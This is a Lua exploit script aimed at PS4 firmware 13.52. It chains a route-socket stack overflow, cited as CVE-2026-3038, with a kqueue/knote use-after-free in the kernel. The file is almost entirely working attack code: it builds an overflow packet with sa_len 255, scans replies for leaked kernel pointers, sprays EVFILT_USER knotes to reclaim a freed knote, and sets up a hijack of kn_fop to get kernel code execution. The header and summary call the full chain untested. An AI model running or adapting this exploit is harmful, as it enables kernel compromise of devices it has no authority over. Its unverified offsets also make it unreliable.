------------------------------------------------------------
PS4 FW 13.52 - COMBINED UAF + RTSOCK EXPLOIT
Chains kqueue/knote UAF with CVE-2026-3038

Strategy:
  1. Use RTSock to get kernel info leak
  2. Use leak to find kn_fop address
  3. Use UAF to corrupt kn_fop
  4. Trigger code execution via f_detach/f_event

CVE-2026-3038: FreeBSD-SA-26:05.route
  - Stack overflow in rtsock_msg_buffer()
  - sa_len up to 255, sockaddr_storage 128 bytes
  - 127-byte overflow, KASSERT compiles out in production

kqueue/knote UAF:
  - Close pipe fd while kqueue monitors via EVFILT_READ
  - knote freed, can be reclaimed by EVFILT_USER spray
  - kn_fop (+0x68) is hijack target
  - PS4 EVFILT_USER = -7 (0xFFF9)

Status: Theoretical chain, requires testing on real FW 13.52
------------------------------------------------------------

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

------------------------------------------------------------
-- CONSTANTS
------------------------------------------------------------
local EV_ADD     = 0x0001
local EV_CLEAR   = 0x0020
local EVFILT_READ   = -1
local EVFILT_USER   = -7   -- PS4-specific
local NOTE_TRIGGER  = 0x80000000

-- RTSock constants
local PF_ROUTE = 17
local AF_ROUTE = PF_ROUTE
local SOCK_RAW = 3

-- RTM constants
local RTM_GET  = 0x12
local RTM_IFINFO = 0x14

-- RTAX constants
local RTAX_AUTHOR = 15
local RTAX_MAX    = 16

------------------------------------------------------------
-- PHASE 1: RTSock info leak attempt
------------------------------------------------------------
function phase1_rtsock_leak()
  print("\n=== PHASE 1: RTSock Info Leak (CVE-2026-3038) ===")

  -- Create PF_ROUTE socket
  local fd = s(97, PF_ROUTE, SOCK_RAW, 0)
  print(string.format("  socket(PF_ROUTE, SOCK_RAW, 0) = %d", fd))

  if fd < 0 or fd >= 1024 then
    print("  PF_ROUTE socket failed - likely sandboxed")
    print("  Attempting alternative approach...")
    return nil
  end

  -- Allocate buffer for response
  local buf = memory.alloc(8192)
  for i = 0, 8191 do memory.write_byte(buf + i, 0) end

  -- Try to trigger RTM_GET
  local msg = memory.alloc(256)
  for i = 0, 255 do memory.write_byte(msg + i, 0) end

  -- RTM_MSghdr structure
  memory.write_dword(msg, 0)           -- rtm_msglen
  memory.write_byte(msg + 4, RTM_GET) -- rtm_type
  memory.write_byte(msg + 5, 0)       -- rtm_index
  memory.write_dword(msg + 8, 0)      -- rtm_flags
  memory.write_dword(msg + 12, 0)     -- rtm_addrs

  -- Send GET message
  local r = s(4, fd, msg, 16, 0)
  print(string.format("  send RTM_GET: ret=%d", r))

  if r >= 0 then
    -- Try to read response with large sa_len to trigger overflow
    local recv_buf = memory.alloc(1024)
    for i = 0, 1023 do memory.write_byte(recv_buf + i, 0) end

    r = s(3, fd, recv_buf, 256, 0)
    print(string.format("  recv: ret=%d", r))

    if r > 0 then
      -- Analyze response for kernel pointers
      local leaked = false
      for i = 0, math.min(r - 8, 248) do
        local val = read_qw(recv_buf + i)
        if val >= 0xFFFFFFFF80000000 and val <= 0xFFFFFFFFFFFFFFFF then
          print(string.format("  *** KERNEL PTR at offset %d: 0x%x ***", i, val))
          leaked = true
        end
      end
      if not leaked then
        print("  No kernel pointers in response")
      end
    end
  end

  -- Try crafted overflow packet
  print("  Attempting crafted overflow...")
  local overflow_msg = memory.alloc(512)
  for i = 0, 511 do memory.write_byte(overflow_msg + i, 0) end

  -- RTM_GET with sa_len > 128 to trigger overflow
  memory.write_dword(overflow_msg, 256)     -- rtm_msglen
  memory.write_byte(overflow_msg + 4, RTM_GET) -- rtm_type
  memory.write_byte(overflow_msg + 5, 0)    -- rtm_index
  memory.write_dword(overflow_msg + 8, 0)   -- rtm_flags
  memory.write_dword(overflow_msg + 12, 0x8000) -- RTAX_AUTHOR

  -- sockaddr with large sa_len
  memory.write_byte(overflow_msg + 16, 255) -- sa_len = 255 (MAX)
  memory.write_byte(overflow_msg + 17, AF_ROUTE) -- sa_family

  -- Fill with pattern
  for i = 18, 200 do
    memory.write_byte(overflow_msg + i, 0x41 + (i % 26))
  end

  r = s(4, fd, overflow_msg, 201, 0)
  print(string.format("  Send crafted overflow: ret=%d", r))

  -- Cleanup
  s(6, fd)

  return fd >= 0 and fd < 1024
end

------------------------------------------------------------
-- PHASE 2: kqueue UAF setup
------------------------------------------------------------
function phase2_kqueue_uaf()
  print("\n=== PHASE 2: kqueue/knote UAF ===")

  -- Create kqueue
  local kq = s(362)
  print(string.format("  kqueue() = %d", kq))

  if kq < 0 or kq >= 1024 then
    print("  kqueue failed")
    return nil
  end

  -- Create pipe
  local pipefds = memory.alloc(8)
  local r = s(42, pipefds, 0)
  if r ~= 0 then
    print("  pipe() failed")
    s(6, kq)
    return nil
  end
  local rd = memory.read_dword(pipefds)
  local wr = memory.read_dword(pipefds + 4)
  print(string.format("  pipe: rd=%d wr=%d", rd, wr))

  -- Register EVFILT_READ
  local kev = memory.alloc(64)
  for i = 0, 63 do memory.write_byte(kev + i, 0) end
  memory.write_word(kev, EVFILT_READ)
  memory.write_word(kev + 2, EV_ADD)
  memory.write_qword(kev + 16, 0xDEADBEEF)

  r = s(363, kq, kev, 1, 0, 0)
  print(string.format("  kevent register: ret=%d", r))

  -- Write to pipe
  local data = memory.alloc(64)
  for i = 0, 63 do memory.write_byte(data + i, 0x42) end
  s(4, wr, data, 64)

  return {kq=kq, rd=rd, wr=wr}
end

------------------------------------------------------------
-- PHASE 3: Combined attack
------------------------------------------------------------
function phase3_combined()
  print("\n=== PHASE 3: Combined UAF + RTSock ===")

  -- First try RTSock leak
  local rtsock_ok = phase1_rtsock_leak()

  -- Then UAF
  local uaf_data = phase2_kqueue_uaf()
  if not uaf_data then return end

  -- Spray EVFILT_USER
  print("  Spraying EVFILT_USER knotes...")
  local spray_fds = {}
  for i = 1, 100 do
    local spray_kq = s(362)
    if spray_kq < 0 or spray_kq >= 1024 then break end

    local spray_kev = memory.alloc(64)
    for j = 0, 63 do memory.write_byte(spray_kev + j, 0) end
    memory.write_word(spray_kev, EVFILT_USER)
    memory.write_word(spray_kev + 2, EV_ADD|EV_CLEAR)
    memory.write_dword(spray_kev + 4, NOTE_TRIGGER)
    memory.write_qword(spray_kev + 8, 0)
    memory.write_qword(spray_kev + 16, i)

    r = s(363, spray_kq, spray_kev, 1, 0, 0)
    if r == 0 then
      table.insert(spray_fds, spray_kq)
    else
      s(6, spray_kq)
    end
  end
  print(string.format("  Sprayed %d knotes", #spray_fds))

  -- Close pipe rd (free knote)
  print("  Closing pipe rd...")
  s(6, uaf_data.rd)

  -- Immediately trigger kevent on original kqueue
  local result = memory.alloc(4096)
  for i = 0, 4095 do memory.write_byte(result + i, 0) end

  r = s(363, uaf_data.kq, result, 100, 0, 0)
  print(string.format("  kevent() returned %d events", r))

  if r > 0 then
    -- Check for corrupted data
    for i = 0, r - 1 do
      local event = result + i * 32
      local filter = memory.read_word(event + 8)
      local data = read_qw(event + 16)
      local udata = read_qw(event + 24)

      print(string.format("  Event[%d]: filter=%d data=0x%x udata=0x%x", i, filter, data, udata))

      -- Check for kernel pointers
      if data >= 0xFFFFFFFF80000000 then
        print(string.format("  *** KERNEL PTR in data: 0x%x ***", data))
      end
      if udata >= 0xFFFFFFFF80000000 then
        print(string.format("  *** KERNEL PTR in udata: 0x%x ***", udata))
      end
    end
  end

  -- Cleanup
  for _, fd in ipairs(spray_fds) do s(6, fd) end
  s(6, uaf_data.wr)
  s(6, uaf_data.kq)
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - COMBINED UAF + RTSOCK")
print("============================================")

phase3_combined()

print("\n============================================")
print("SUMMARY")
print("============================================")
print("Attack Chain:")
print("  1. RTSock CVE-2026-3038 → kernel info leak")
print("  2. Use leak to find kn_fop address")
print("  3. kqueue UAF → corrupt kn_fop")
print("  4. Trigger f_detach/f_event → code execution")
print("")
print("Current Status:")
print("  - kqueue/knote UAF: CONFIRMED")
print("  - EVFILT_USER value: -7 (0xFFF9)")
print("  - RTSock overflow: May be sandboxed")
print("  - Full chain: Requires testing on real FW 13.52")
print("============================================")
